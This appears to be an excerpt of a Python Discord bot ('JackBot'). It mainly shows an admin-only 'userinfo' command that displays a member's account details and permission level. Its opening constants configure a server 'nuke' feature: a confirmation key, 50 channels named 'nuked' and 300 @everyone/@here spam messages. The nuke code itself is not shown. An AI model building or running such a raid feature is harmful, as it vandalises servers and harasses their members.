...
NUKE_KEY = "HRMAS8048"  # Change this to your secret confirmation key
CHANNEL_BASE_NAME = "nuked"
SPAM_MSG = "@everyone @here DONT MESS WITH HRMAS"
CHANNEL_COUNT = 50
SPAM_COUNT = 300
...
# ────────────────────────────────────────────────
# ────────────────────────────────────────────────
# Userinfo Command (Admin Only)
# ────────────────────────────────────────────────
@tree.command(name="userinfo", description="View detailed information about a user (Admin Only)")
@app_commands.default_permissions(administrator=True) # Makes the command admin-only
@app_commands.describe(member="The user to get info about (defaults to you)")
async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
    member = member or interaction.user
    
    # Define roles as a string
    ...
    embed.set_footer(text=f"ID: {member.id} • JackBot")

    # Information Fields
    embed.add_field(name="Account Name", value=f"{member.name}#{member.discriminator}", inline=True)
    embed.add_field(name="Nickname", value=member.nick or "None", inline=True)
    embed.add_field(name="Bot?", value="Yes" if member.bot else "No", inline=True)
    
    embed.add_field(name="Joined Discord", value=discord.utils.format_dt(member.created_at, "F"), inline=False)
    ...
    # Permissions check (Highest permission)
    if member.guild_permissions.administrator:
        perm_summary = "Administrator"
    elif member.guild_permissions.manage_guild:
        perm_summary = "Manager"
    else:
        perm_summary = "Member"
    
    embed.add_field(name="Highest Permission Level", value=perm_summary, inline=True)
